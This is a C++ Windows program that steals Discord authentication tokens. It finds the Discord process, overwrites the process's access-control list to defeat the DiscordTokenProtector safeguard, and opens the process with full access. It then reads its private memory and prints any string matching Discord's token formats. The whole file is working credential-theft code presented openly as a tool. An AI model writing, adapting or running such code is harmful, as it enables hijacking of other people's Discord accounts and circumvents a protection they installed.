#include <Windows.h>
#include <TlHelp32.h>
#include <aclapi.h>

#include <iostream>
#include <optional>
#include <vector>
#include <regex>
#include <map>

int GetDiscord();
void RestoreNormalDACL(int);
std::optional<std::string> GetToken(int);

int main() {
	auto pid = GetDiscord();

	if (pid == 0) {
		return EXIT_SUCCESS;
	}

	std::cout << "[+] Found Discord process\n";

	RestoreNormalDACL(pid);

	std::cout << "[+] Restored DACL entries\n";

	auto token = GetToken(pid);

	if (!token.has_value())
		return EXIT_SUCCESS;

	std::cout << "[+] Token: " << *token << '\n';

	std::cin.get();
}

int GetDiscord() {
	int pid = 0;

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	auto snapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	Process32First(snapShot, &entry);

	do {
		if (std::wcscmp(L"Discord.exe", entry.szExeFile) == 0) {
			pid = entry.th32ProcessID;
			break;
		}
	} while (Process32Next(snapShot, &entry));

	CloseHandle(snapShot);
	return pid;
}


/*
 * DiscordTokenProtector hooks CreateThread and removes all DACL entries,
 * this revokes any default permission to do anything to the process,
 * this function takes the DACL of this process and replaces
 * DiscordTokenProtectors with that, restoring default perm
 */
void RestoreNormalDACL(int pid) {
	auto handle = OpenProcess(WRITE_DAC, 0, pid);

	PSECURITY_DESCRIPTOR sd;
	GetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, nullptr, nullptr, nullptr, nullptr, &sd);

	PACL dacl;
	BOOL daclPresent = FALSE;
	BOOL daclDefaulted = FALSE;

	GetSecurityDescriptorDacl(sd, &daclPresent, &dacl, &daclDefaulted);
	// in theory, you can just set dacl to zero and it'll grant all access to everyone but whatever
	SetSecurityInfo(handle, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION | UNPROTECTED_DACL_SECURITY_INFORMATION, 0, 0, dacl, 0);
	CloseHandle(handle);
}


// took this from DiscordTokenProtector code
std::optional<std::string> GetToken(int pid) {
	auto handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

	std::map<std::string, size_t> results;
	std::vector<std::string> invalids;

	MEMORY_BASIC_INFORMATION info;

	auto isValidStrChar = [](char c) {
		return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_';
	};

	auto getRegPosSize = [](std::string data, const std::regex& reg) {
		std::vector<std::pair<size_t, size_t>> results;

		std::smatch matches;

		while (std::regex_search(data, matches, reg)) {
			results.push_back({ matches.position(0), matches.length(0) });
			data = std::string(matches.suffix().str());
		}

		return results;
	};

	for (unsigned char* p = NULL; VirtualQueryEx(handle, p, &info, sizeof(info)) == sizeof(info); p += info.RegionSize) {
		if (info.Type == MEM_PRIVATE) {
			std::vector<char> buffer;
			std::vector<char>::iterator pos;

			SIZE_T bytes_read;
			buffer.resize(info.RegionSize);
			ReadProcessMemory(handle, p, &buffer[0], info.RegionSize, &bytes_read);
			buffer.resize(bytes_read);

			std::string currentString;
			currentString.reserve(512);

			for (size_t i = 0; i < buffer.size(); i++) {
				if (isValidStrChar(buffer[i])) {
					currentString.push_back(buffer[i]);
				}
				else {
					if (currentString.empty())
						continue;
					else if (currentString.size() < 59)
						currentString.clear();
					else {
						static const std::vector<std::regex> tokenRegex = {
							std::regex(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"),
							std::regex(R"(mfa\.[\w-]{84})")
						};

						for (const auto& reg : tokenRegex) {
							auto possize = getRegPosSize(currentString, reg);

							for (const auto& [pos, size] : possize) {
								std::string match = currentString.substr(pos, size);

								if (results.find(match) == results.end()) {
									if (std::find(invalids.begin(), invalids.end(), match) == invalids.end()) {
										results.insert({ match, 1 });
									}
								}
								else {
									results[match] += 1;
								}
							}
						}

						currentString.clear();
					}
				}
			}
		}
	}

	if (!results.empty())
		return results.rbegin()->first;
	else
		return std::nullopt;
}

